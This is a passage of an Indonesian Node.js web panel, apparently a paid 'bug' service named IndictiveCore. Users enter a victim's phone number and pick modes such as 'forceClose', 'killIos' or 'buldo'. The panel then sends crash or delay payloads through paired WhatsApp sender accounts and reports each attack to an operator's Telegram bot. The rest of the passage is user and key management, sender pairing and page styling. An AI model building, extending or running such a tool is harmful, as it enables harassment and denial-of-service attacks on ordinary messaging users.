      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "⚠️ Target dan mode harus diisi" 
      });
    }

    const phoneValidation = validatePhoneNumber(target);
    
    if (!phoneValidation.isValid) {
      return res.status(400).json({
        success: false,
        error: `❌ ${phoneValidation.message}`
      });
    }

    const cleanTarget = phoneValidation.cleanNumber;
    const country = phoneValidation.country || getCountryCode(cleanTarget);

    if (cleanTarget.length < 7 || cleanTarget.length > 17) {
      return res.status(400).json({
        success: false,
        error: "❌ Panjang nomor harus 7-17 digit"
      });
    }

    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "📵 Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    const validModes = ["fortrash", "invisDelay", "forbut", "forceClose", "buldo", "killIos"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `⚙️ Mode '${mode}' tidak valid. Pilih: ${validModes.join(', ')}`
      });
    }

    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "🔌 Sender tidak aktif. Periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    let bugResult;
    let bugName = "";
    
    try {
      console.log(chalk.green.bold(`\n[TR4SH CORE] 🚀 User: ${username}\nMode: ${mode}\nTarget: ${cleanTarget} (${country})\n`));
      
      if (mode === "forceClose") {
        bugName = "FORCLOSE INVIS";
        bugResult = await forklos(sock, 24, targetJid);
      } else if (mode === "fortrash") {
        bugName = "FORCLOSE TRASH";
        bugResult = await trashkill(sock, 24, targetJid);
      } else if (mode === "forbut") {
        bugName = "FORCLOSE FORCE";
        bugResult = await force(sock, 24, targetJid);
        } else if (mode === "invisDelay") {
        bugName = "Invisible Delay";
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "killIos") {
        bugName = "Kill IOS";
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "buldo") {
        bugName = "BULDOZER";
        bugResult = await buldokill(sock, 24, targetJid);
      }

      const logMessage = `
<blockquote>⚡ <b>NEW EXECUTION - ${country.toUpperCase()}</b></blockquote>

👤 <b>User:</b> <code>${username}</code>
📞 <b>Sender:</b> <code>${userSender}</code>
🎯 <b>Target:</b> <code>${cleanTarget}</code> (${country})
📱 <b>Mode:</b> ${bugName}
🔢 <b>Country Code:</b> ${cleanTarget.substring(0, 3)}...
⏰ <b>Time:</b> ${new Date().toLocaleString("id-ID", {timeZone: "Asia/Jakarta"})}
✅ <b>Status:</b> SUCCESS - Sent to server

<i>Powered by IndictiveCore V3 • Phone Helper Detection</i>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("❌ Gagal kirim log Telegram:", err.message));

      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: `✅ Bug berhasil dikirim ke ${cleanTarget}`,
        details: {
          target: cleanTarget,
          mode: mode,
          bugName: bugName,
          country: country,
          sender: userSender,
          timestamp: Date.now(),
          formattedTarget: `+${cleanTarget}`
        }
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      
      const errorLog = `
<blockquote>❌ <b>EXECUTION FAILED</b></blockquote>

👤 <b>User:</b> <code>${username}</code>
🎯 <b>Target:</b> <code>${cleanTarget}</code> (${country})
📱 <b>Mode:</b> ${bugName}
⚠️ <b>Error:</b> <code>${error.message}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString("id-ID")}`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: errorLog,
        parse_mode: "HTML"
      }).catch(err => console.error("❌ Gagal kirim error log Telegram:", err.message));

      res.status(500).json({
        success: false,
        error: `💥 Gagal mengeksekusi bug: ${error.message}`,
        suggestion: "Cek koneksi sender atau coba beberapa menit lagi"
      });
    }

  } catch (error) {
    console.error("❌ FATAL Error in POST /execution:", error);
    
    // Log error ke Telegram
    const fatalLog = `
<blockquote>💀 <b>FATAL EXECUTION ERROR</b></blockquote>

⚠️ <b>Error:</b> <code>${error.message}</code>
📋 <b>Stack:</b> <code>${error.stack?.substring(0, 200)}...</code>
⏰ <b>Time:</b> ${new Date().toLocaleString("id-ID")}`;

    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: fatalLog,
      parse_mode: "HTML"
    }).catch(err => console.error("❌ Gagal kirim fatal log Telegram:", err.message));

    res.status(500).json({
      success: false,
      error: "🔥 Terjadi kesalahan internal server",
      details: "Tim developer telah diberitahu"
    });
  }
});

app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// ================== API ENDPOINTS FOR SENDER MANAGEMENT ================== //
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (cleanNumber.length < 7) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Route untuk halaman user management
app.get("/user-management", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "user-management.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file user-management.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan semua user
app.get("/api/users", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }
  
  let filteredUsers = [];
  
  if (currentUser.role === 'owner') {
    filteredUsers = users;
  } else if (currentUser.role === 'admin') {
    filteredUsers = users.filter(u => u.role === 'user');
  } else {
    return res.status(403).json({ error: "Forbidden" });
  }
  
  const responseUsers = filteredUsers.map(user => ({
    username: user.username,
    role: user.role,
    key: currentUser.role === 'owner' ? user.key : '********',
    expired: user.expired,
    status: Date.now() > user.expired ? 'Expired' : 'Active'
  }));
  
  res.json({ 
    success: true,
    users: responseUsers 
  });
});

app.get("/api/user/:username", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const targetUsername = req.params.username;
  const users = getUsers();
  
  const currentUser = users.find(u => u.username === username);
  const targetUser = users.find(u => u.username === targetUsername);
  
  if (!currentUser || !targetUser) {
    return res.json({ success: false, error: "User not found" });
  }
  
  if (currentUser.role === 'admin') {
    if (targetUser.role !== 'user') {
      return res.json({ success: false, error: "Forbidden" });
    }
  }
  
  res.json({
    success: true,
    user: {
      username: targetUser.username,
      role: targetUser.role,
      key: currentUser.role === 'owner' ? targetUser.key : '********',
      expired: targetUser.expired
    }
  });
});

app.post("/api/user", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const { username: newUsername, role, key, duration } = req.body;
  
  const users = getUsers();
  
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.json({ success: false, error: "User not found" });
  }
  
  if (currentUser.role === 'admin' && role !== 'user') {
    return res.json({ success: false, error: "Admin can only create users" });
  }
  
  if (!['owner', 'admin', 'user'].includes(role)) {
    return res.json({ success: false, error: "Invalid role" });
  }
  
  if (users.find(u => u.username === newUsername)) {
    return res.json({ success: false, error: "Username already exists" });
  }
  
  let expired;
  if (duration === 'permanent') {
    expired = Date.now() + (365 * 10 * 86400000);
  } else {
    const durationMs = parseDuration(duration);
    if (!durationMs) {
      return res.json({ success: false, error: "Invalid duration" });
    }
    expired = Date.now() + durationMs;
  }
  
  let userKey;
  if (key && key.trim() !== '') {
    userKey = key.trim();
    
    if (userKey.length < 4) {
      return res.json({ success: false, error: "Key minimal 4 karakter" });
    }
    
    if (users.find(u => u.key === userKey)) {
      return res.json({ success: false, error: "Key sudah digunakan, coba key lain" });
    }
  } else {
    userKey = generateKey(6);
  }
  
  const newUser = {
    username: newUsername,
    key: userKey,
    expired: expired,
    role: role,
    telegram_id: "",
    isLoggedIn: false,
    createdBy: username,
    createdAt: Date.now()
  };
  
  users.push(newUser);
  saveUsers(users);
  
  res.json({
    success: true,
    message: "User created successfully",
    user: {
      username: newUser.username,
      role: newUser.role,
      key: newUser.key,
      expired: newUser.expired
    }
  });
});

app.put("/api/user/:username", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const targetUsername = req.params.username;
  const { role, key, duration } = req.body;
  const users = getUsers();
  
  const currentUser = users.find(u => u.username === username);
  const targetUserIndex = users.findIndex(u => u.username === targetUsername);
  
  if (!currentUser || targetUserIndex === -1) {
    return res.json({ success: false, error: "User not found" });
  }
  
  const targetUser = users[targetUserIndex];
  
  if (targetUser.role === 'owner') {
    return res.json({ success: false, error: "Cannot edit user with owner role" });
  }
  
  if (currentUser.role === 'admin') {
    if (targetUser.role !== 'user') {
      return res.json({ success: false, error: "Forbidden" });
    }
    
    if (role && role !== 'user') {
      return res.json({ success: false, error: "Admin can only set role to 'user'" });
    }
  }
  
  if (role && ['owner', 'admin', 'user'].includes(role)) {
    if (role === 'owner') {
      return res.json({ success: false, error: "Cannot set role to owner via web interface" });
    }
    users[targetUserIndex].role = role;
  }
  
  if (key && key.trim() !== '' && key.trim() !== targetUser.key) {
    const newKey = key.trim();
    
    if (newKey.length < 4) {
      return res.json({ success: false, error: "Key minimal 4 karakter" });
    }

    if (users.find(u => u.key === newKey && u.username !== targetUsername)) {
      return res.json({ success: false, error: "Key sudah digunakan, coba key lain" });
    }
    
    users[targetUserIndex].key = newKey;
  }

  if (duration) {
    if (duration === 'permanent') {
      users[targetUserIndex].expired = Date.now() + (365 * 10 * 86400000);
    } else {
      const durationMs = parseDuration(duration);
      if (durationMs) {
        users[targetUserIndex].expired = Date.now() + durationMs;
      }
    }
  }
  
  saveUsers(users);
  
  res.json({
    success: true,
    message: "User updated successfully"
  });
});

app.delete("/api/user/:username", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const targetUsername = req.params.username;
  const users = getUsers();
  
  const currentUser = users.find(u => u.username === username);
  const targetUser = users.find(u => u.username === targetUsername);
  
  if (!currentUser || !targetUser) {
    return res.json({ success: false, error: "User not found" });
  }
  
  if (targetUser.role === 'owner') {
    return res.json({ success: false, error: "Cannot delete user with owner role via web" });
  }
  
  if (currentUser.role === 'admin') {
    if (targetUser.role !== 'user') {
      return res.json({ success: false, error: "Forbidden" });
    }
  }
  
  const updatedUsers = users.filter(u => u.username !== targetUsername);
  saveUsers(updatedUsers);
  
  res.json({
    success: true,
    message: "User deleted successfully"
  });
});

// API untuk check session (dipanggil setiap 1 menit dari client)
app.get("/api/session-check", (req, res) => {
    const username = req.cookies.sessionUser;
    const clientSessionId = req.cookies.sessionId;
    
    if (!username || !clientSessionId) {
        return res.status(401).json({ error: "No session" });
    }
    
    const activeSession = activeSessions.get(username);
    if (!activeSession || activeSession.sessionId !== clientSessionId) {
        return res.status(403).json({ error: "Invalid session" });
    }
    
    res.json({ valid: true, username: username });
});

app.get("/api/session-heartbeat", requireAuth, (req, res) => {
  res.json({ success: true, timestamp: Date.now() });
});

app.get("/logout", (req, res) => {
    const username = req.cookies.sessionUser;
    
    if (username) {
        activeSessions.delete(username);
        savePersistentSessions();
    }
    
    const sessionId = req.cookies.sessionId;
    if (sessionId) {
        for (const [user, sessionData] of activeSessions.entries()) {
            if (sessionData.sessionId === sessionId) {
                activeSessions.delete(user);
                console.log(`[LOGOUT] Also removed ${user} by sessionId match`);
                break;
            }
        }
    }

    const clearCookieOptions = {
        path: '/',
        httpOnly: true,
        expires: new Date(0)
    };
    
    res.clearCookie("sessionUser", clearCookieOptions);
    res.clearCookie("sessionId", clearCookieOptions);
    
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', 'Thu, 01 Jan 1970 00:00:00 GMT');
    res.setHeader('X-Accel-Expires', '0');
    
    const logoutPage = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Logging out...</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
        <script>
            localStorage.removeItem('indictive_username');
            localStorage.removeItem('indictive_password');
            
            document.cookie = "sessionUser=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
            document.cookie = "sessionId=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
            
            window.history.replaceState(null, null, window.location.href);
            
            setTimeout(function() {
                window.location.href = '/login?msg=' + encodeURIComponent('Logout berhasil') + '&t=' + Date.now();
            }, 500);
        </script>
    </head>
    <body style="background: #080310; color: white; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh;">
        <div style="text-align: center;">
            <div style="font-size: 24px; margin-bottom: 20px; color: #db2777;">🔐</div>
            <div>Logging out...</div>
            <div style="font-size: 12px; color: #9ca3af; margin-top: 10px;">Cleaning session data...</div>
        </div>
    </body>
    </html>`;
    
    res.send(logoutPage);
});

app.post("/api/logout-other-device", async (req, res) => {
  try {
    const { username, password } = req.body;
    const users = getUsers();
    
    // Verify credentials
    const user = users.find(u => u.username === username && u.key === password);
    if (!user) {
      return res.json({ success: false, error: "Invalid credentials" });
    }
    
    // Delete existing session for this user
    activeSessions.delete(username);
    savePersistentSessions();
    
    res.json({ 
      success: true, 
      message: "Other device logged out successfully" 
    });
    
  } catch (error) {
    console.error("Logout other device error:", error);
    res.json({ success: false, error: "Internal server error" });
  }
});

app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/my-support", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "my-supports.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// ==================== STARTUP FUNCTIONS ==================== //
const figlet = require('figlet');
const gradient = require('gradient-string');
const boxen = require('boxen');
const ora = require('ora');

// --- Start Animation Logic ---
function startIntro() {
    console.clear();

    // 1. Render Big Text
    figlet('Indictive', { font: 'Standard' }, (err, data) => {
        if (err) return;
        
        // Tampilkan Teks Besar dengan Gradasi
        console.log(gradient.pastel.multiline(data));

        // 2. Data Info Bot
        const ownerName = 'Restzy';
        const ownerCnl = ['@Restzy'];
        const infoText = `
Author    : ${ownerName}
Version   : 6.0.0
Owner ID  : ${ownerCnl.join(', ')}
Status    : Active
        `.trim();

        // 3. Tampilkan Kotak Info
        console.log(boxen(infoText, {
            padding: 1,
            margin: 0,
            borderStyle: 'round',
            borderColor: 'cyan',
            title: 'System Information',
            titleAlignment: 'center'
        }));
        
        console.log('\n');
        
        console.table({
            'Apps': 'IndictiveCore',
            'Type': 'web2app',
            'Version': 6
        });
        
        console.log('\n');

        // 4. Jalankan Spinner dengan CUSTOM ANIMATION (Gaya mu)
        // Disini rahasianya: Kita masukin frames kamu ke dalam ora
        const spinner = ora({
            text: 'Initializing IndictiveCore modules...',
            spinner: {
                interval: 80,
                frames: ['⏤    ', ' ⏤⏤   ', '  ⏤⏤⏤ ', '   ⏤⏤⏤', '    ⏤⏤', '     ⏤']
            }
        }).start();

        // Simulasi Loading
        setTimeout(() => {
            // Ubah text tapi animasi tetap jalan
            spinner.text = 'Connecting to database...';
            spinner.color = 'yellow';
        }, 2000);

        setTimeout(() => {
            spinner.succeed(chalk.yellow('System ready. IndictiveCore is now online!'));
            spinner.succeed(chalk.blue(`Klick your domain here. ${VPS}:${PORT}`));
            console.log(chalk.green(`┌────────────────────────────────────┐
│           IndictiveCore            │
└────────────────────────────────────┘`));

            console.log(chalk.dim('Waiting for messages...'));
            
            bot.launch();
        }, 3000);
    });
}

startIntro();
// ==================== SCHEDULED TASKS ==================== //
// nambahin periodic health check biar aman aja
setInterval(() => {
    const backupPath = path.join(__dirname, "database", "sessions.json") + '.backup-' + new Date().toISOString().split('T')[0];
    try {
        const sessionsPath = path.join(__dirname, "database", "sessions.json");
        if (fs.existsSync(sessionsPath)) {
            fs.copyFileSync(sessionsPath, backupPath);
        }
    } catch (err) {
        console.error('[BACKUP] Failed to backup sessions:', err);
    }
}, 24 * 60 * 60 * 1000);

setInterval(() => {
  const activeSessionCount = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessionCount}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessionCount === 0) {
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessionCount > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

setInterval(cleanupExpiredSessions, 60 * 60 * 1000);
setTimeout(cleanupExpiredSessions, 5000);

// Start server
app.listen(PORT, () => {
  console.log(chalk.green(`✓ Server sudah aktif`));
});

// ==================== HTML EXECUTION FUNCTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>APOCALYPSE VOID - Execution</title>
    
    <!-- Load Font Share Tech Mono -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* --- VARIABLES (UPDATED TO BLUE THEME) --- */
        :root {
            --bg-dark: #000000; /* Plain black background */
            --bg-gradient: none; /* Remove gradient for plain black */
            
            --accent-blue: #3b82f6;      /* Primary blue */
            --accent-blue-light: #60a5fa; /* Lighter blue */
            --accent-blue-dark: #1d4ed8;  /* Darker blue */
            --accent-cyan: #06b6d4;       /* Cyan accent */
            --accent-green: #10b981;
            
            --text-gray: #9ca3af; 
            --font-main: 'Share Tech Mono', monospace;
            
            /* Notification colors */
            --notif-success: #10b981;
            --notif-warning: #f59e0b;
            --notif-error: #ef4444;
            --notif-info: #3b82f6;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body {
            background-color: var(--bg-dark); /* Plain black */
            background-image: var(--bg-gradient);
            color: #ffffff;
            font-family: var(--font-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            letter-spacing: 0.5px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding-bottom: 110px; 
            position: relative;
        }

        /* --- HEADER --- */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 24px; 
            background: rgba(0, 0, 0, 0.95);
            z-index: 50;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
        }

        .header-left { display: flex; align-items: center; gap: 15px; }

        .menu-btn {
            cursor: pointer;
            color: #3b82f6; /* Blue color */
            transition: transform 0.2s;
        }
        .menu-btn:active {
            transform: scale(0.9);
            color: var(--accent-blue-light);
        }

        .brand-title {
            font-size: 20px; 
            font-weight: 400;
            letter-spacing: 1.5px;
            color: #fff;
            text-shadow: 0 0 10px rgba(59, 130, 246, 0.7); /* Blue glow */
        }

        /* --- MAIN CONTENT --- */
        main {
            padding: 20px 24px; 
            display: flex;
            flex-direction: column;
            gap: 20px; 
        }

        /* === USER CARD - FIXED LAYOUT === */
        .user-card {
            width: 100%;
            height: 95px; 
            border-radius: 16px;
            border: 1px solid rgba(59, 130, 246, 0.3); /* Blue border */
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.15); /* Blue shadow */
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.15) 0%, rgba(6, 182, 212, 0.15) 100%); /* Blue gradient */
            display: flex;
            align-items: center; 
            padding: 0 16px; 
            position: relative;
            overflow: hidden; /* Prevent content from leaking out */
        }

        .user-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.5), transparent);
        }

        .user-card-content {
            width: 100%;
            display: flex;
            align-items: center; 
            gap: 14px;
            overflow: hidden; /* Fix: prevent content overflow */
        }

        .profile-photo {
            width: 60px; 
            height: 60px;
            border-radius: 50%;
            border: 3px solid rgba(59, 130, 246, 0.3); /* Blue border */
            overflow: hidden;
            flex-shrink: 0; /* Prevent shrinking */
            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
        }

        .profile-photo img {
            width: 100%; 
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .user-info-middle {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center; 
            gap: 4px;
            overflow: hidden; /* Fix: prevent text overflow */
            min-width: 0; /* Fix: allow text truncation */
        }

        .username {
            font-size: 16px; 
            color: white;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            line-height: 1.2;
            max-width: 100%; /* Fix: limit width */
        }

        .role-box {
            display: inline-flex;
            align-items: center;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            padding: 3px 8px;
            border: 1px solid rgba(59, 130, 246, 0.2); /* Blue border */
            width: fit-content;
            max-width: 100%; /* Fix: prevent overflow */
            overflow: hidden; /* Fix: hide overflow */
        }

        .role-label { 
            font-size: 8px; 
            color: var(--text-gray); 
            margin-right: 5px; 
            text-transform: uppercase; 
            white-space: nowrap;
        }
        .role-value { 
            font-size: 10px; 
            color: var(--accent-blue); /* Blue role text */
            text-transform: uppercase; 
            font-weight: bold; 
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 80px; /* Limit width */
        }

        .expiry-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 6px 10px;
            border: 1px solid rgba(59, 130, 246, 0.2); /* Blue border */
            min-width: 75px;
            flex-shrink: 0; /* Prevent shrinking */
            margin-left: auto; /* Push to the right */
        }

        .expiry-label { 
            font-size: 8px; 
            color: var(--text-gray); 
            margin-bottom: 2px; 
            text-transform: uppercase; 
            white-space: nowrap;
        }
        .expiry-date { 
            font-size: 11px; 
            color: white; 
            white-space: nowrap;
        }

        /* === BANNER === */
        .banner {
            width: 100%;
            height: 140px; 
            border-radius: 12px;
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(59, 130, 246, 0.2); /* Blue border */
            box-shadow: 0 3px 10px rgba(0,0,0,0.25);
        }
        
        .banner img { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            opacity: 1;
        }
        
        .banner-text {
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%;
            display: flex; 
            align-items: flex-end;
            justify-content: flex-start;
            padding: 13px;
            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 100%);
        }
        
        .banner-text h2 {
            font-size: 15px; 
            letter-spacing: 1px;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.9); 
            margin: 0;
        }

        /* FORM INPUTS */
        .input-group { margin-bottom: 0; }

        .input-header {
            background: linear-gradient(90deg, rgba(59, 130, 246, 0.8), rgba(6, 182, 212, 0.8)); /* Blue gradient */
            padding: 10px 15px; 
            border-radius: 10px 10px 0 0;
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-bottom: none;
        }
        .input-header h3 { font-size: 15px; letter-spacing: 1px; color: white; } 

        .input-body {
            background-color: rgba(15, 23, 42, 0.7); /* Dark blue background */
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-top: none;
            border-radius: 0 0 10px 10px;
            padding: 15px; 
            display: flex; align-items: center; gap: 12px;
        }
        .input-body i { color: var(--accent-blue); font-size: 18px; } /* Blue icons */

        .custom-input {
            background: transparent; border: none; outline: none;
            color: #d1d5db; font-family: var(--font-main);
            font-size: 14px; 
            width: 100%;
        }
        .custom-input::placeholder { color: #6b7280; font-size: 14px; }
        
        /* --- HORIZONTAL SCROLLABLE TYPE SELECTOR (REPLACES DROPDOWN) --- */
        .type-selector-container {
            width: 100%;
            position: relative;
            margin-top: 5px;
        }

        .type-selector-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding: 0 5px;
        }

        .type-selector-header h3 {
            font-size: 14px;
            color: #fff;
            letter-spacing: 1px;
        }

        .scroll-hint {
            color: var(--accent-blue);
            font-size: 11px;
            display: flex;
            align-items: center;
            gap: 5px;
            opacity: 0.8;
        }

        .type-selector-scroll {
            display: flex;
            overflow-x: auto;
            gap: 10px;
            padding: 10px 0 15px 0;
            scrollbar-width: thin;
            scrollbar-color: var(--accent-blue) rgba(0, 0, 0, 0.3);
            -webkit-overflow-scrolling: touch;
            scroll-snap-type: x proximity;
        }

        .type-selector-scroll::-webkit-scrollbar {
            height: 4px;
        }

        .type-selector-scroll::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }

        .type-selector-scroll::-webkit-scrollbar-thumb {
            background: var(--accent-blue);
            border-radius: 10px;
        }

        .type-option {
            flex: 0 0 auto;
            width: 140px;
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
